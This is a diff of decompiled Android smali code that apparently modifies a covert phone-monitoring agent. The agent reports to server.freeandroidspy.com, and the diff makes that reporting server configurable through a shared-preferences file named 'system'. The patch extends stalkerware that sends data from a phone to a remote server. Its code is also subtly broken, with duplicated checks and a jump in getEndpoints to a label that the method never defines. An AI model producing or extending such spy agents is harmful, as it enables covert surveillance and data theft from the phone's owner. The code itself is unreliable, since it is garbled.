@@ -3,6 +3,12 @@
 .source "Configuration.java"
 
 
+# static fields
+.field public static final DEFAULT_ENDPOINT:Ljava/lang/String; = "https://server.freeandroidspy.com:443/index.php"
+
+.field public static final PREF_KEY_ENDPOINT:Ljava/lang/String; = "server_endpoint"
+
+
 # instance fields
 .field protected defaultHeartbeatInterval:I
 
@@ -72,25 +78,83 @@
     return v0
 .end method
 
-.method public getEndpoints()[Ljava/net/URI;
-    .locals 3
+.method public getEndpoints(Landroid/content/Context;)[Ljava/net/URI;
+    .locals 7
 
     const/4 v0, 0x1
 
     .line 173
     new-array v0, v0, [Ljava/net/URI;
 
-    const-string v1, "https://server.freeandroidspy.com:443/index.php"
+    sget-object v1, Lcom/hp/vd/agent/Configuration;->DEFAULT_ENDPOINT:Ljava/lang/String;
+
+    const/4 v2, 0x0
+
+    if-eqz p1, :cond_1
+
+    const-string v3, "system"
+
+    const/4 v4, 0x0
+
+    const/4 v2, 0x0
+
+    if-eqz p1, :cond_2
+
+    const-string v3, "system"
+
+    const/4 v4, 0x0
 
     .line 174
+    invoke-virtual {p1, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
+
+    move-result-object v3
+
+    if-eqz v3, :cond_1
+
+    sget-object v4, Lcom/hp/vd/agent/Configuration;->PREF_KEY_ENDPOINT:Ljava/lang/String;
+
+    const-string v5, ""
+
+    invoke-interface {v3, v4, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-virtual {v3}, Ljava/lang/String;->length()I
+
+    move-result v4
+
+    if-lez v4, :cond_1
+
+    move-object v1, v3
+
+    :cond_1
+    :try_start_0
+    invoke-static {v1}, Ljava/net/URI;->create(Ljava/lang/String;)Ljava/net/URI;
+
+    move-result-object v3
+    :try_end_0
+    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_0
+
+    aput-object v3, v0, v2
+
+    goto :goto_0
+
+    :catch_0
+    move-exception v3
+
+    sget-object v1, Lcom/hp/vd/agent/Configuration;->DEFAULT_ENDPOINT:Ljava/lang/String;
+
     invoke-static {v1}, Ljava/net/URI;->create(Ljava/lang/String;)Ljava/net/URI;
 
     move-result-object v1
 
-    const/4 v2, 0x0
-
     aput-object v1, v0, v2
 
+    :goto_0
     return-object v0
 .end method
 
@@ -287,6 +351,31 @@
     move-result-object v1
 
     iput-object v1, v0, Lcom/hp/vd/data/SystemData;->session:Ljava/lang/String;
+
+    sget-object v1, Lcom/hp/vd/agent/Configuration;->DEFAULT_ENDPOINT:Ljava/lang/String;
+
+    sget-object v2, Lcom/hp/vd/agent/Configuration;->PREF_KEY_ENDPOINT:Ljava/lang/String;
+
+    const-string v3, ""
+
+    invoke-interface {p1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-virtual {v2}, Ljava/lang/String;->length()I
+
+    move-result v3
+
+    if-lez v3, :cond_2
+
+    move-object v1, v2
+
+    :cond_2
+    iput-object v1, v0, Lcom/hp/vd/data/SystemData;->endpoint:Ljava/lang/String;
 
     const-string v1, "initial_wakeup_delay"
 
